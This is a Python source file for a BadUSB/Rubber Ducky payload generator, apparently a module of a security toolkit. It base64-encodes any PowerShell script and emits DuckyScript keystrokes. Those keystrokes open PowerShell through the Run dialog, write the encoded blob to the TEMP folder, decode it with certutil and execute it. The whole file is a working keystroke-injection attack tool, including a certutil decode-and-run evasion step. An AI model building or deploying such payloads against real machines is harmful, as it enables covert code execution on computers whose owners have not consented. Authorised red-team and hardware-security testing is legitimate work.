#!/usr/bin/env python3
"""
badusb — BadUSB / Rubber Ducky payload generator.
Encodes a PowerShell script as base64 and wraps it in DuckyScript that
opens PowerShell, decodes and runs it via certutil.

secV interface: reads {"target":"<label>","params":{...}} from stdin → JSON stdout.
Direct CLI:     python3 badusb.py <script.ps1> [--adv]
"""

import base64
import json
import sys
from pathlib import Path

BADUSB_DIR = Path.home() / ".secv" / "badusb"


def _b64_encode_file(file_path: str) -> str:
    """Read file and return base64 string without newlines."""
    data = Path(file_path).read_bytes()
    return base64.b64encode(data).decode()


def generate_payload(
    file_path: str,
    title: str = "",
    description: str = "",
    author: str = "",
    version: str = "",
    delay_after_ps: int = 500,
    ducky_lang: bool = False,
) -> dict:
    if not Path(file_path).exists():
        return {"success": False, "error": f"File not found: {file_path}"}

    ext = Path(file_path).suffix.lower()
    if ext != ".ps1":
        return {"success": False, "error": "Only .ps1 files are supported"}

    b64 = _b64_encode_file(file_path)

    lines = []
    if title or description or author or version:
        if title:       lines.append(f"REM Title      : {title}")
        if description: lines.append(f"REM Description: {description}")
        if author:      lines.append(f"REM Author     : {author}")
        if version:     lines.append(f"REM Version    : {version}")
        if ducky_lang:  lines.append("DUCKY_LANG US")

    lines += [
        "REM BadUSB payload — adjust DELAYs for target hardware",
        "DELAY 2000",
        "GUI r",
        "DELAY 200",
        "STRING powershell",
        "DELAY 500",
        "ENTER",
        f"DELAY {delay_after_ps}",
        (
            'STRING $TempFile = "$env:TEMP\\temp.ps1"; '
            '$File = "$env:TEMP\\l.ps1"; '
            f'echo {b64} > "$TempFile"; '
            'certutil -f -decode "$TempFile" "$File" | out-null; '
            '& "$env:TEMP\\l.ps1"'
        ),
        "DELAY 1000",
        "ENTER",
    ]

    payload_text = "\n".join(lines)
    return {
        "success": True,
        "source": str(file_path),
        "payload": payload_text,
        "b64_size": len(b64),
        "line_count": len(lines),
    }


def op_generate(params: dict, target: str = "") -> dict:
    file_path = params.get("file_path") or params.get("script") or target
    if not file_path:
        return {"success": False, "error": "file_path (path to .ps1) is required"}

    result = generate_payload(
        file_path=file_path,
        title=params.get("title", ""),
        description=params.get("description", ""),
        author=params.get("author", ""),
        version=params.get("version", ""),
        delay_after_ps=int(params.get("delay_after_ps", 500)),
        ducky_lang=str(params.get("ducky_lang", "false")).lower() in ("true", "1", "yes"),
    )
    if not result["success"]:
        return result

    out = params.get("output", "")
    if out:
        Path(out).write_text(result["payload"])
        result["saved_to"] = str(out)
    else:
        BADUSB_DIR.mkdir(parents=True, exist_ok=True)
        stem = Path(file_path).stem
        out_path = BADUSB_DIR / f"{stem}_badusb.txt"
        Path(out_path).write_text(result["payload"])
        result["saved_to"] = str(out_path)

    return result


def op_preview(params: dict, target: str = "") -> dict:
    result = op_generate(params, target)
    if not result["success"]:
        return result
    print(result["payload"])
    return result


def op_encode(params: dict, target: str = "") -> dict:
    file_path = params.get("file_path") or params.get("script") or target
    if not file_path:
        return {"success": False, "error": "file_path is required"}
    if not Path(file_path).exists():
        return {"success": False, "error": f"File not found: {file_path}"}
    b64 = _b64_encode_file(file_path)
    return {"success": True, "file": str(file_path), "base64": b64}


# ── Dispatcher ────────────────────────────────────────────────────────────────
def dispatch(context: dict) -> dict:
    params = context.get("params", {})
    target = context.get("target", "")
    mode   = params.get("mode", "generate").lower()

    ops = {
        "generate": op_generate,
        "preview":  op_preview,
        "encode":   op_encode,
    }

    if mode not in ops:
        return {
            "success": False,
            "error": f"Unknown mode '{mode}'",
            "valid_modes": list(ops.keys()),
        }

    return ops[mode](params, target)


def main():
    if len(sys.argv) > 1 and not sys.stdin.isatty():
        pass
    elif len(sys.argv) > 1:
        import argparse
        ap = argparse.ArgumentParser(description="BadUSB payload encoder")
        ap.add_argument("file_path", help=".ps1 script to encode")
        ap.add_argument("--adv", action="store_true", help="Prompt for title/author/etc.")
        ap.add_argument("--output", default="", help="Output file path")
        args = ap.parse_args()

        params = {"file_path": args.file_path, "output": args.output}
        if args.adv:
            params["title"]       = input("Title: ").strip()
            params["description"] = input("Description: ").strip()
            params["author"]      = input("Author: ").strip()
            params["version"]     = input("Version: ").strip()
            params["ducky_lang"]  = "true"

        result = op_generate(params)
        print(json.dumps(result, indent=2))
        if result.get("success"):
            print(f"\n[+] Payload saved: {result.get('saved_to')}")
        return

    raw = sys.stdin.read().strip()
    if not raw:
        print(json.dumps({"success": False, "error": "No input. Pass JSON or provide .ps1 path as CLI arg."}))
        return

    try:
        context = json.loads(raw)
    except json.JSONDecodeError:
        context = {"target": raw, "params": {}}

    result = dispatch(context)
    print(json.dumps(result, default=str, indent=2))


if __name__ == "__main__":
    main()
